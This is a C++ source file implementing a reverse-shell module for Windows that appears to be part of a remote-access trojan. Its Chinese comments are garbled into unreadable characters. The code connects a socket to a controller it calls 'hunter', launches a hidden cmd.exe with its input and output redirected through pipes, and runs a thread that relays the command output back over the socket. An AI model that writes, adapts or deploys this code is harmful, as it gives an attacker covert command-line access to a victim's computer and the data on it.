#include "pch.h"
#include "Shell.h"

#define SEND_SIZE   256
#define RESULT_SIZE 2048

static Shell gShell; // ��ʼ����
static TcpSocket gSock; // �������ݵ��׽���
// �ĸ�HANDLE �������������ܵ�
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// ���������н���֮���õ���pi ����cmd����
static PROCESS_INFORMATION gPi = { 0 };
// ׼������
// ׼������
static CHAR szSend[SEND_SIZE] = { 0 };
static CHAR szResult[RESULT_SIZE] = { 0 };

void Shell::startShell(std::string domain, int port) {
	// �½����ӵ�hunter�˵�socket����
	if (!gSock.connectTo(domain, port)) {
		gSock.dissconnect();
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}
	// �����ӽ���
	// ��ʱsocket����׼����
	if (!createCmd()) {
		OutputDebugStringA("create cmd exe failed\r\n");
		gSock.dissconnect();
		return;
	}
	// ������ͨcmd��socket���̺߳���
	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
		gSock.dissconnect();
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// ����cmd�ӽ���
bool Shell::createCmd() {
	// ���������ܵ�
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failed\r\n");
		return false;
	}

	// ��Ϊ����ʹ�� ����Ҫ����׼��
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// ����cmd����
	STARTUPINFOA si = { 0 };
	// ���ش���
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// ���ñ�׼��������ʹ��󵽹ܵ�
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// ƴ�����������е�����
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		CloseHandle(ghReadPipe1);
		CloseHandle(ghReadPipe2);
		CloseHandle(ghWritePipe1);
		CloseHandle(ghWritePipe2);
		return false;
	}

	return true;
}

// �̺߳��� ����ͨ�ܵ���socket
DWORD Shell::threadProc(LPVOID args) {
	// ���ݴ���ѭ��
	while (true)
	{
		// -------------------------------���չܵ����ݲ��֣�������ԣ�----------------------------
		DWORD dwBytesResult = 0;
		RtlZeroMemory(szResult, sizeof(szResult));
		// �ȿ���û������ ��ֹû�����ݻ�ȥ���������
		if (!PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
			break;
		}
		// �����ݾͶ�
		if (dwBytesResult) {
			RtlZeroMemory(szResult, sizeof(szResult));
			if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
				break;
			}
			// �������ݾ��ͻ�hunter
			if (!gSock.sendData(szResult, lstrlenA(szResult))) {
				break;
			}
		}

	}
	
	// һ����������ʹ������
	CloseHandle(ghReadPipe1);
	CloseHandle(ghReadPipe2);
	CloseHandle(ghWritePipe1);
	CloseHandle(ghWritePipe2);
	gSock.dissconnect();
	return 1;
}
